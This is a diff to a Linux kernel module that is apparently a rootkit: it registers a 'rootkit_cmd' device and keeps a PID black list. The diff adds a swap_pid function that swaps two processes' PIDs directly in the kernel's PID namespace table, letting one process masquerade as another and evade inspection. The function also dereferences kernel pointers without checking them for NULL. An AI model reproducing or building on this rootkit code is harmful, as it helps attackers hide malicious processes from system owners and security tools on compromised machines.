@@ -228,6 +228,23 @@ void show_pid(unsigned int tgid)
     write_unlock(&tgid_black_list_lock);
 }
 
+void swap_pid(unsigned int tgid1, unsigned int tgid2)
+{
+    struct struct_list *node, *safe;
+    struct file *f = filp_open("/proc", O_RDONLY, 0);
+    if (IS_ERR(f))
+        return;
+    struct pid_namespace *ns = proc_pid_ns(file_inode(f)->i_sb);
+    filp_close(f, 0);
+    struct pid *data1 = idr_find(&ns->idr, tgid1);
+    struct pid *data2 = idr_find(&ns->idr, tgid2);
+    int tmp = data1->numbers[ns->level].nr;
+    data1->numbers[ns->level].nr = data2->numbers[ns->level].nr;
+    data2->numbers[ns->level].nr = tmp;
+    idr_replace(&ns->idr, data2, tgid1);
+    idr_replace(&ns->idr, data1, tgid2);
+}
+
 void utils_init()
 {
     chrdev_add("rootkit_cmd", &fops);
